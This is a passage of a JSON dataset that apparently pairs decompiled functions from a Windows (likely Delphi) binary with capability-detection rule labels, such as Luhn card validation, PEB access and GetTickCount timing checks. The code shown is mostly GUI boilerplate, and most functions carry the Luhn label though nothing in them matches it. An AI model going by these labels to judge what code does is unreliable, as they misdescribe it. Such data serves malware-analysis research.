        "decompiled_code": "\nvoid __fastcall fcn.004516dc(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.0044d1c8(uVar1, uVar2);\n    fcn.0045250c();\n    uVar1 = fcn.0044d1c8();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.00451804();\n    return;\n}\n",
        "token_count": 237
    },
    "00451980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00451980(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.0044f928();\n        iVar1 = fcn.0044f488();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.0044f928();\n    }\n    fcn.004518f0(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 148
    },
    "004519d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004519d0(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.00444ebc();\n        fcn.00444ebc();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 333
    },
    "00451c04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451c04(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0044fc7c();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00413a6c();\n            iVar1 = fcn.00450460();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.004519d0(uVar2);\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.00451a4c(&stack0xfffffffc);\n        }\n        else {\n            fcn.00451acc(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "00451f24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451f24(uint param_1, uint param_2)\n\n{\n    fcn.00403154(param_2, param_1);\n    return;\n}\n",
        "token_count": 41
    },
    "00451f54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00451f54(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    \n    if (param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403154(param_2);\n        iStack12 = param_1;\n    }\n    return CONCAT44(iStack12, uVar1);\n}\n",
        "token_count": 102
    },
    "00452270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00452270(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x452351;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar4 = (**(*in_EAX + 8))();\n    if (var_10h == 0x12) {\n        fcn.00404da0();\n    }\n    else if ((iVar4 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n        fcn.00444ebc();\n        (***in_EAX)();\n        iVar2 = *(iVar4 + 0x40) * 2 - var_20h;\n        iVar3 = *(iVar4 + 0x44) * 2 - var_1ch;\n        iVar1 = *(iVar4 + 0x48);\n        iVar4 = *(iVar4 + 0x4c);\n        fcn.004455ac();\n        fcn.00404df4();\n        *in_ECX = iVar2;\n        in_ECX[1] = iVar3;\n        in_ECX[2] = iVar1 * -2 + var_18h * 3 + iVar2 * -2;\n        in_ECX[3] = iVar4 * -2 + var_14h * 3 + iVar3 * -2;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x452358;\n    uStack60 = 0x452350;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 497
    },
    "004529b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004529b0(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x452b28;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.00409c80(puVar3);\n    fcn.00404df4();\n    uVar1 = fcn.00405264();\n    *0x496504 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.00409c80(puVar3);\n    fcn.00404df4();\n    uVar1 = fcn.00405264();\n    *0x496506 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.00405264();\n    *0x496510 = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x496548 = fcn.0041515c();\n    fcn.004525b8();\n    *0x4964f0 = fcn.00452364();\n    uVar1 = fcn.0045f9d4();\n    **0x492ce0 = uVar1;\n    uVar1 = fcn.00460c54();\n    **0x492b60 = uVar1;\n    fcn.00462d08();\n    fcn.004148ac();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x452b64);\n    if (iVar2 != 0) {\n        *0x4915d8 = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x452b6c);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00404da0(0x452b2f);\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 618
    },
    "00452b7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00452b7c(int32_t param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00403f28();\n    in_EAX[1] = param_1;\n    (**(*in_EAX + 0x14))();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 184
    },
    "00453218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00453218(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.0041b50c();\n    in_EAX[0xd] = in_ECX;\n    in_EAX[0xc] = arg_8h;\n    (**(*in_EAX + 0x34))();\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 204
    },
    "004533a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.004533a4(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint var_18h;\n    uint hdc;\n    int32_t var_4h;\n    \n    uStack36 = 0;\n    puStack40 = 0x4533b5;\n    var_4h = in_EAX;\n    hdc = sub.user32.dll_GetDC();\n    uStack44 = 0x453445;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piVar1 = *(var_4h + 0x50);\n    puStack40 = &stack0xfffffffc;\n    sub.gdi32.dll_CreateCompatibleBitmap(hdc, *(var_4h + 0x34), *(var_4h + 0x30));\n    fcn.00427258();\n    fcn.004265e4();\n    fcn.004214d4();\n    arg_ch = (**(*piVar1 + 0x20))();\n    arg_8h = &fcn.004533a4::var_18h;\n    (**(*piVar1 + 0x2c))();\n    fcn.00413a94(arg_8h, arg_ch);\n    fcn.004265e4(&fcn.004533a4::var_18h);\n    fcn.00421878();\n    *in_FS_OFFSET = arg_8h;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x45344c);\n    return;\n}\n",
        "token_count": 388
    },
    "00453468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00453468(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = *(in_EAX + 0x34);\n    uStack12 = *(in_EAX + 0x30);\n    puVar1 = &uStack8;\n    sub.comctl32.dll_ImageList_GetIconSize(param_2, puVar1, &uStack12);\n    *(in_EAX + 0x34) = puVar1;\n    *(in_EAX + 0x30) = param_2;\n    fcn.004533a4();\n    return;\n}\n",
        "token_count": 158
    },
    "004536a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004536a0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x4536bb;\n    fcn.00426010();\n    uStack36 = 0x45374f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x4536d8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00426010();\n    uStack48 = 0x453732;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00453398();\n    uVar1 = fcn.00453574();\n    uVar2 = fcn.00453574(uVar1);\n    uVar1 = *(in_EAX + 0x3c);\n    sub.comctl32.dll_ImageList_Add(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00403f58(0x453739);\n    return;\n}\n",
        "token_count": 331
    },
    "004542e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.004542e0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != NULL) {\n        puStack32 = 0x4542f8;\n        iVar1 = fcn.00453888();\n        puStack32 = 0x454301;\n        iVar2 = fcn.00453888();\n        if (iVar1 == iVar2) {\n            puStack32 = 0x454315;\n            iVar1 = fcn.00453888();\n            if (iVar1 != 0) {\ncode_r0x0045432d:\n                puStack32 = 0x454339;\n                fcn.00403f28();\n                uStack36 = 0x4543bc;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack44 = 0x454354;\n                puStack32 = &fcn.004542e0::var_1h + 1;\n                (**(*in_EAX + 0x3c))();\n                puStack44 = 0x454360;\n                fcn.00403f28();\n                uStack48 = 0x45439f;\n                uStack52 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffcc;\n                puStack44 = &fcn.004542e0::var_1h + 1;\n                (**(*param_2 + 0x3c))();\n                var_1h._0_1_ = fcn.0045429c();\n                *in_FS_OFFSET = uStack52;\n                puStack44 = 0x4543a6;\n                uStack48 = 0x45439e;\n                uVar3 = fcn.00403f58();\n                return uVar3;\n            }\n            puStack32 = 0x454320;\n            iVar1 = fcn.00453888();\n            if (iVar1 != 0) goto code_r0x0045432d;\n            var_1h._0_1_ = 1;\n            goto code_r0x004543c3;\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x004543c3:\n    return var_1h;\n}\n",
        "token_count": 622
    },
    "0045442c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045442c(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0041b89c();\n    uVar2 = *(*in_EAX + 0x38);\n    uVar1 = *(*in_EAX + 0x3c);\n    piVar3 = in_EAX;\n    fcn.004543d0(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1, in_EAX, uVar2, piVar3);\n    return;\n}\n",
        "token_count": 164
    },
    "00454718": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00454718(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStackY48;\n    uint uStackY44;\n    uchar *puStackY40;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY40 = 0x454737;\n    iVar1 = fcn.0041c03c(0);\n    uStackY44 = 0x454778;\n    iStackY48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (iVar1 != 0) {\n        iVar1 = iVar1 + 0x14;\n    }\n    puStackY40 = &stack0xfffffffc;\n    sub.comctl32.dll_ImageList_Read();\n    fcn.00453528();\n    *in_FS_OFFSET = iVar1;\n    uStackY44 = 0x45477f;\n    iStackY48 = 0x454777;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 235
    },
    "004552f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004552f0(code *arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(*(in_EAX + 0x30) + 8);\n    if (-1 < iVar1 + -1) {\n        iVar2 = 0;\n        do {\n            if (*(*(*(*(in_EAX + 0x30) + 4) + iVar2 * 4) + 4) == in_EDX) {\n                (*arg_8h)();\n            }\n            iVar2 = iVar2 + 1;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "00455730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00455730(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.0041be44();\n    *(in_EAX + 0x6a) = 1;\n    *(in_EAX + 0x80) = 0xffffffff;\n    *(in_EAX + 0x86) = 1;\n    *(in_EAX + 0x90) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 196
    },
    "00458004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00458004(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x491754;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x491754 = 0;\n    uStack36 = 0x4580b5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    *0x491750 = 1;\n    uStack48 = 0x458077;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.00457fb4, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x491750 = 0;\n    *0x491754 = uVar1;\n    return;\n}\n",
        "token_count": 287
    },
    "004581e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.004581e0(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint uStack8;\n    uchar uStack4;\n    \n    uStack8 = sub.user32.dll_GetActiveWindow();\n    uStack4 = 0;\n    pcVar2 = fcn.004581c0;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004581c0, &uStack8);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    return CONCAT44(pcVar2, pcVar2) & 0xffffffff000000ff;\n}\n",
        "token_count": 135
    },
    "00458434": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00458434(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x4584a5;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.00458424();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00406a50();\n        fcn.0040c5e8(in_stack_ffffffd4, arg_ch);\n        fcn.004047cc();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x4584ac;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 290
    },
    "004584b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004584b4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.0040427c();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00403f28();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 327
    },
    "0045906c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045906c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004483a4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x4590e0;\n    uVar1 = fcn.004584b4(0);\n    *(in_EAX + 0x250) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.004584b4(1);\n    *(in_EAX + 0x254) = uVar1;\n    *(in_EAX + 600) = 0;\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 255
    },
    "00459678": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00459678(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    in_EAX[0x97] = in_EAX[0x97] + 1;\n    uStack24 = 0x4596e4;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.0044b618();\n    (**(*in_EAX + 0xe0))();\n    *in_FS_OFFSET = uStack28;\n    in_EAX[0x97] = in_EAX[0x97] + -1;\n    return;\n}\n",
        "token_count": 179
    },
    "00459830": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459830(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x459891;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004040e4();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.0044c514();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 219
    },
    "004598c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004598c0(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x4598de;\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x459a24;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x459900;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x492cd0 + 0x14))();\n    uStack320 = 0x459a04;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x45991f;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xf0))();\n    puStack332 = 0x459927;\n    iVar2 = fcn.00403e30();\n    if ((iVar2 != *0x456c00) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) | 1;\n        uStack336 = 0x4599cc;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.00414ca4();\n        if (cVar1 == '\\0') {\n            fcn.00403e38();\n            var_10h = &fcn.004598c0::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.004598c0::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.00406a50();\n            fcn.0040c5e8(in_stack_fffffea4, arg_ch);\n            fcn.004047cc();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x459a0b;\n    uStack324 = 0x459a03;\n    (**(***0x492cd0 + 0x18))();\n    return;\n}\n",
        "token_count": 781
    },
    "0045a620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a620(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.0044d80c(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.0041bb4c(),  -1 < var_8h + -1)) {\n        do {\n            fcn.0041bb20();\n            cVar1 = fcn.00404154();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "0045df2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045df2c(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x34c)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0045e9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
